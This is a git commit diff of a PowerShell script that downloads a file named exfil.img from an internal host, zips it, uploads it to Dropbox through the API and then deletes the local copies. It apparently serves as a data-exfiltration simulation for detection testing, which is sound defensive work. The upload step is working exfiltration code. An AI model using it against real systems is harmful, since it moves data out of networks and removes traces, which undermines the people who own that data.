1da66f7eaf3c4ac16b47f1da247680b3bf17f595
jwlogrhythm <joshua.wilson@logrhythm.com>
2022-07-07 08:01:57 -0600

    Added functionality to check for if files already exsit

--- main.ps1
+++ main.ps1
@@ -1,23 +1,41 @@
-$SourceFilePath="C:\Users\Administrator\Downloads\exfil.zip"
+$file = "C:\projects\exfil.img"
+$ZipFilePath="C:\projects\exfil.zip"
 
 #LR-ToDo: Need to set it up so the token is read from an ini file
+#This block is for the api request
 #Need to put token in the double qoutes
 $authorization = "Bearer " + ""
-
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-
 $headers.Add("Authorization", $authorization)
-
 $headers.Add("Dropbox-API-Arg", '{"path":"/Apps/LR-DE/exfil.zip", "mode": "add", "autorename": true, "mute": false}')
-
 $headers.Add("Content-Type", 'application/octet-stream')
 
+#If the file does not exist, download and zip it
+if (-not(Test-Path -Path $file -PathType Leaf)) {
+	try {
+		Invoke-WebRequest -Uri "http://192.168.100.115/exfil.img" -OutFile $file
+		Write-Host "File has been downloaded."
+		Compress-Archive -LiteralPath $file -DestinationPath $ZipFilePath
+		Write-Host "File has been zipped up."
+	}
+	catch {
+		throw $_.Exception.Message
+	}
+}
 
-#Downloads file from server
-Invoke-WebRequest -Uri "http://192.168.100.115/exfil.img" -OutFile "C:\Users\Administrator\Downloads\exfil.img"
-
-#Compresses file that is downloaded
-Compress-Archive -LiteralPath 'C:\Users\Administrator\Downloads\exfil.img' -DestinationPath 'C:\Users\Administrator\Downloads\exfil.zip'
+#If the file exists then delete it and download it
+else {
+	Write-Host "File already exists. Now deleting file."
+	Remove-Item $file
+	Remove-Item $ZipFilePath
+	Invoke-WebRequest -Uri "http://192.168.100.115/exfil.img" -OutFile $file
+	Write-Host "File has been downloaded."
+	Compress-Archive -LiteralPath $file -DestinationPath $ZipFilePath
+	Write-Host "File has been zipped up."
+}
 
 #Uploads file to dropbox via api
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $ZipFilePath -Headers $headers
+#Remove files
+Remove-Item $file
+Remove-Item $ZipFilePath
